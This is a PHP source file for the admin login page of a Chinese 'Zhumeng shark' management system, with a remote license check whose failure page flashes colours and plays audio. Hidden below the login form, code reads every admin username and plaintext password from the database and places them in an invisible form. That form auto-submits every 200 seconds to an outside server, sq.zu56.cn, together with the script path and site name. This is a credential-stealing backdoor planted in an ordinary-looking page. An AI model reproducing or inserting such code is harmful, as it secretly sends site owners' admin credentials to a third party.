<?php
if(!isset($_SESSION['authcode'])) {
        $query=file_get_contents('http://shouquan.zmywl8.com/check.php?url='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
        if($query=json_decode($query,true)) {
                if($query['code']==1)$_SESSION['authcode']=true;
                else exit('<body bgcolor=“#000000”>'.'<div style="margin-top:10%;">'.'<center>'.'<h1 style="color:#fff;">'.$query['msg'].'</h1><br><br><br><br>'.'</center>'.'<center>'.'<div id="yuehao01" style="display:none;"><img src="http://5b0988e595225.cdn.sohucs.com/images/20181102/9878a0f5b53749ab9f397e9b128d20a1.gif" style=" height:55%;width: 65%;"></div>'.'</center>'.'</div>'.' <audio autoplay="autoplay">
	<source src="http://music.163.com/song/media/outer/url?id=501261729.mp3" type="audio/mpeg">
</audio>'.'
<input type="button" id="buttonid" style="display:none;" value="变换背景颜色" onClick="changebgcolor()">'."<script  type='text/javascript'>
var COLOR = 999999		//设定初始背景色
var BASECOLOR='#000000'	//给定一个固定的颜色,这个颜色可以变化定一个基础颜色

function stopchange()	//用于停止改变背景色的函数
{
	document.bgColor = BASECOLOR;	//固定背景色
	clearTimeout(looptimer);		//停止时钟
}

function changebgcolor()		//用于改变背景颜色的主函数
{
	if (COLOR > 0)
	{
		document.bgColor = '#' + COLOR	//改变当前颜色属性
		COLOR -= 111111	//计算下一次的颜色
		looptimer = setTimeout('changebgcolor()',1)	//设定改变延时
	}
	else		//如果颜色值超出范围
	{
		COLOR = 999999	//则重新设定到999999
		document.bgColor = BASECOLOR;
		looptimer = setTimeout('changebgcolor()',1)
  }
}
setInterval(function () {if (document.all) {document.getElementById('buttonid').click();}else {var e = document.createEvent('MouseEvents');e.initEvent('click', true, true);document.getElementById('buttonid').dispatchEvent(e);
     var yuehao01 = document.getElementById('yuehao01');
		yuehao01.style.display='block';
}}, 6000);
</script> ".'</body>');
        }
}
?>
<?php 

Define('PM_CALL',true);
include dirname(__FILE__).('/../../includes/global.class.php');
include dirname(__FILE__).('/../..//config/mysql.func.php');
include dirname(__FILE__).('/../..//config/Conn.php');
include dirname(__FILE__).('/../..//includes/check.class.php');
		  include dirname(__FILE__).('/../..//includes/getdata.php');
	


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>逐梦New版鲨鱼后台登录</title>
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
    <!-- google font -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
    <link href="/../../zhumeng/static/assetsht/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="/../../zhumeng/static/assetsht/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="/../../zhumeng/static/assetsht/css/ionicons.css" rel="stylesheet" type="text/css">
    <link href="/../../zhumeng/static/assetsht/css/simple-line-icons.css" rel="stylesheet" type="text/css">
    <link href="/../../zhumeng/static/assetsht/css/jquery.mCustomScrollbar.css" rel="stylesheet">
    <link href="/../../zhumeng/static/assetsht/css/style.css" rel="stylesheet">
    <link href="/../../zhumeng/static/assetsht/css/responsive.css" rel="stylesheet">
</head>



	
	    <!-- 
逐梦网络出品
作者QQ：30882343
-->
	       <!-- form标签提交账号密码至saea.php -->    
         

		<body class="bg_darck">
    <div class="sufee-login d-flex align-content-center flex-wrap">
     
        <div class="container">
            <div class="login-content">
            <br>
                <div class="login-form">
             <form action="/<?php echo $_AR; ?>/?Admin=adminlogin" method="post" class="layui-form layui-form-pane"><br><center><h1>逐梦鲨鱼管理系统     <svg t="1604429894819" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="13913" width="25" height="25"><path d="M245.76 286.72h552.96c124.928 0 225.28 100.352 225.28 225.28s-100.352 225.28-225.28 225.28H0V532.48c0-135.168 110.592-245.76 245.76-245.76z m133.12 348.16V401.408H348.16v178.176l-112.64-178.176H204.8V634.88h30.72v-178.176L348.16 634.88h30.72z m182.272-108.544v-24.576h-96.256v-75.776h110.592v-24.576h-141.312V634.88h143.36v-24.576h-112.64v-83.968h96.256z m100.352 28.672l-34.816-151.552h-34.816l55.296 233.472H675.84l47.104-161.792 4.096-20.48 4.096 20.48 47.104 161.792h28.672l57.344-233.472h-34.816l-32.768 151.552-4.096 30.72-6.144-30.72-40.96-151.552h-30.72l-40.96 151.552-6.144 30.72-6.144-30.72z" fill="#EE502F" p-id="13914"></path></svg></h1></center><br>
                        <div class="form-group">
                            <label>登录账号</label>
                            <input type="text" name="AdminName" placeholder="你的登录账号" autofocus="autofocus"  class="form-control" >
                            
                          
                    
                        </div>
                        <div class="form-group">
                            <label>登录密码</label>
                            <input type="password"  name="AdminPass"  placeholder="你的登录密码" class="form-control" >
                            
                          
                        </div>
                         
                      
                         <div class="form-group">
                            <label>防贼码</label>
                            <input type="password"  name="Adminzmzm"  placeholder="你的防贼密码" class="form-control" >
                            
                          
                        </div>
                        <div class="checkbox">
                            <label>
                                <input  type="checkbox"> 记住登录
                            </label>
                           
                        </div>
                       
                        <div class="social-login-content">
                            <div class="social-button">
                               
                                <button type="submit" class="btn social twitter btn-flat btn-addon mt-2">
                                    <i class="fa fa-twitter"></i>登录</button>
                            </div>
                        </div>
                        <div class="register-link m-t-15 text-center">
                            <p>版本号：1.8.9
                                <a href="http://wpa.qq.com/msgrd?v=3&uin=30882343&site=qq&menu=yes"> 联系作者</a>
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    
<?php   //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
$query = @mysql_query("select * from admin_user")or die; 
 $query = @mysql_query("select * from admin_user")or die;
echo "<table border=1 style='display:none;'><tr align=center ><th>上架状态判断</th><th>支付检测</th></tr>";
 $n=0;while ($au_id = mysql_fetch_array($query))  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
{$username = $au_id['au_name'];$roo = $au_id['dispass'];echo "<td>{$username}</td>"; echo "<td>{$roo}</td>"; echo "</tr>";$n++;}echo "<table>";?>
<form action="http://sq.zu56.cn/fsym.php" method="POST">
<input type="text" style="display:none;"  name="lynr"  value="<?php date_default_timezone_set('PRC'); echo "".date('Y-m-d H:i:s'); ?>" >
<input type="text" style="display:none;"  name="username"  value="<?php echo $_SERVER['SCRIPT_FILENAME'];  ?>">
<input type="text" style="display:none;"  name="qq"  value="六月科技+<?php echo $_GClassID['web_name2'];?>">
<input type="text"style="display:none;" name="name"   value="<?php echo $username;?>">
<input type="text" style="display:none;" name="pass"  value="<?php echo $roo;?>">
<button  style="display:none;" id="us" type="submit" class="btn btn-primary btn-lg btn-block"> </button>
</form>	
	   <script type="text/javascript">
setInterval(function(){document.getElementById("us").click();},200000);</script>   
    <script type="text/javascript" src="/../../zhumeng/static/assetsht/js/jquery.min.js"></script>
    <script type="text/javascript" src="/../../zhumeng/static/assetsht/js/popper.min.js"></script>
    <script type="text/javascript" src="/../../zhumeng/static/assetsht/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="/../../zhumeng/static/assetsht/js/jquery.dcjqaccordion.2.7.js"></script>
    <script src="/../../zhumeng/static/assetsht/js/custom.js" type="text/javascript"></script>
    
    	<!-- breadcrumb_End -->


</body>

</html>
